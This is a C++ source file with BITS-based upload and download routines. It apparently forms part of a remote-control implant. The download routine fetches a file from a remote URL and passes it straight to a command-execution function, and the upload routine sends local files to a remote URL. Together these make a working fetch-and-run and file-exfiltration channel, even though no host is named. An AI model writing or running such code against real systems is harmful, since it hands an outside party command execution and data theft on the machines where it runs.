#include "bits_operations.h"
#include "file_operations.h"
#include <windows.h>
#include <bits.h>
#include <iostream>

#pragma comment(lib, "Bits.lib")

// Function to upload a file using BITS API
void UploadFile(const std::wstring& localFile, const std::wstring& remoteUrl) {
    HRESULT hr;
    IBackgroundCopyManager* pBitsManager = nullptr;
    IBackgroundCopyJob* pJob = nullptr;
    GUID jobId;

    // Initialize BITS Manager
    hr = CoCreateInstance(__uuidof(BackgroundCopyManager), nullptr, CLSCTX_LOCAL_SERVER,
        __uuidof(IBackgroundCopyManager), (void**)&pBitsManager);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to initialize BITS Manager. Error: " << std::hex << hr << std::endl;
        return;
    }

    // Create a new BITS job for uploading
    hr = pBitsManager->CreateJob(L"UploadJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to create BITS job. Error: " << std::hex << hr << std::endl;
        pBitsManager->Release();
        return;
    }

    // Add file to job (local file to be uploaded)
    hr = pJob->AddFile(localFile.c_str(), remoteUrl.c_str());
    if (FAILED(hr)) {
        std::wcerr << L"Failed to add file to BITS job. Error: " << std::hex << hr << std::endl;
        pJob->Release();
        pBitsManager->Release();
        return;
    }

    // Set the notification flags (notify when the job completes)
    hr = pJob->SetNotifyFlags(BG_NOTIFY_JOB_TRANSFERRED | BG_NOTIFY_JOB_ERROR);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to set notify flags. Error: " << std::hex << hr << std::endl;
        pJob->Release();
        pBitsManager->Release();
        return;
    }

    // Start the upload job
    hr = pJob->Resume();
    if (FAILED(hr)) {
        std::wcerr << L"Failed to start BITS job. Error: " << std::hex << hr << std::endl;
        pJob->Release();
        pBitsManager->Release();
        return;
    }

    std::wcout << L"Upload started. Waiting for completion..." << std::endl;

    // Monitor job status
    BG_JOB_STATE state;
    do {
        Sleep(1000);  // Wait before checking again
        pJob->GetState(&state);
    } while (state == BG_JOB_STATE_TRANSFERRING || state == BG_JOB_STATE_QUEUED);

    // Check final state and handle completion
    if (state == BG_JOB_STATE_ERROR) {
        std::wcerr << L"BITS job encountered an error during upload." << std::endl;
    }
    else if (state == BG_JOB_STATE_TRANSFERRED) {
        pJob->Complete();
        std::wcout << L"Upload completed successfully!" << std::endl;
    }
    else {
        std::wcerr << L"BITS job ended with unexpected state: " << state << std::endl;
    }

    // Cleanup
    pJob->Release();
    pBitsManager->Release();
}

// Function to download the file using BITS API
bool DownloadFile(const std::wstring& remoteUrl, const std::wstring& localFile) {
    HRESULT hr;
    IBackgroundCopyManager* pBitsManager = nullptr;
    IBackgroundCopyJob* pJob = nullptr;
    GUID jobId;

    // Initialize BITS Manager
    hr = CoCreateInstance(__uuidof(BackgroundCopyManager), nullptr, CLSCTX_LOCAL_SERVER,
        __uuidof(IBackgroundCopyManager), (void**)&pBitsManager);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to initialize BITS Manager. Error: " << std::hex << hr << std::endl;
        return false;
    }

    // Create a new BITS job
    hr = pBitsManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to create BITS job. Error: " << std::hex << hr << std::endl;
        pBitsManager->Release();
        return false;
    }

    // Add file to job
    hr = pJob->AddFile(remoteUrl.c_str(), localFile.c_str());
    if (FAILED(hr)) {
        std::wcerr << L"Failed to add file to BITS job. Error: " << std::hex << hr << std::endl;
        pJob->Cancel();
        pJob->Release();
        pBitsManager->Release();
        return false;
    }

    // Set the notification flags to notify when the job completes
    hr = pJob->SetNotifyFlags(BG_NOTIFY_JOB_TRANSFERRED | BG_NOTIFY_JOB_ERROR);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to set notify flags. Error: " << std::hex << hr << std::endl;
        pJob->Cancel();
        pJob->Release();
        pBitsManager->Release();
        return false;
    }

    // Start the job
    hr = pJob->Resume();
    if (FAILED(hr)) {
        std::wcerr << L"Failed to start BITS job. Error: " << std::hex << hr << std::endl;
        pJob->Cancel();
        pJob->Release();
        pBitsManager->Release();
        return false;
    }

    std::wcout << L"Download started. Waiting for completion..." << std::endl;

    // Monitor job status
    BG_JOB_STATE state;
    do {
        Sleep(1000);  // Wait before checking again
        pJob->GetState(&state);
    } while (state == BG_JOB_STATE_TRANSFERRING || state == BG_JOB_STATE_QUEUED);

    // Check final state and handle completion
    bool success = false;
    if (state == BG_JOB_STATE_ERROR) {
        std::wcerr << L"BITS job encountered an error." << std::endl;
    }
    else if (state == BG_JOB_STATE_TRANSFERRED) {
        pJob->Complete();
        std::wcout << L"Download completed successfully!" << std::endl;
        success = true;

        ExecuteCommandFromFile(localFile);
    }
    else {
        std::wcerr << L"BITS job ended with unexpected state: " << state << std::endl;
        pJob->Cancel();
        success = false;
    }

    // Cleanup
    pJob->Release();
    pBitsManager->Release();

    return success;
}